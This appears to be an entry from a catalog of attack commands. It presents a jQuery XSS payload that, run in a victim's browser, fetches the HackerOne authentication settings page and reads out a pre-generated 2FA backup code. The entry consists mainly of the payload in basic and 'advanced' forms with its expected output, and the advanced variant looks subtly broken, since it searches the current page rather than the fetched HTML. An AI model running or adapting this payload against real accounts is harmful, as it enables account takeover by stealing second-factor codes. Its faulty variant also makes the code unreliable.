---
id: cmd-uuid-1
data: >-
  $.get('https://hackerone.com/settings/authentication/edit').then(function(html){
  console.log($(html).find('#regenerate-backup-codes-authentication-modal
  li:first').text()) })
tags:
  - xss
  - extraction
  - 2fa
type: command
output: A backup code like '37d4 f16d ad0e a6b2'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:47.587Z'
verified: false
validated: true
submitted: true
---
# extract-2fa-backup-code-jquery

## Command

```javascript
$.get('https://hackerone.com/settings/authentication/edit').then(function(html){ console.log($(html).find('#regenerate-backup-codes-authentication-modal li:first').text()) })
```

## Description

This JavaScript command, executed via XSS in a browser console or script tag, fetches the HackerOne authentication edit page via AJAX using jQuery and extracts the text from the first list item in the backup codes modal, revealing a pre-generated backup code.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url (implicit) | Endpoint to fetch: https://hackerone.com/settings/authentication/edit | Yes |
| selector | DOM selector: #regenerate-backup-codes-authentication-modal li:first | Yes |

## Examples

### Basic Usage

```javascript
$.get('https://hackerone.com/settings/authentication/edit').then(function(html){ console.log($(html).find('#regenerate-backup-codes-authentication-modal li:first').text()) })
```

### Advanced Usage

```javascript
$.get('https://hackerone.com/settings/authentication/edit').then(function(html){ var codes = []; $('#regenerate-backup-codes-authentication-modal li').each(function(){ codes.push($(this).text()); }); console.log(codes); })
```

## Expected Output

Console output displaying a backup code, e.g., '37d4 f16d ad0e a6b2'. The same code persists on repeated executions, confirming the pre-generation issue.

## Related

- [[Related Procedure: Extract-2FA-Secrets-Using-XSS-Payload]]
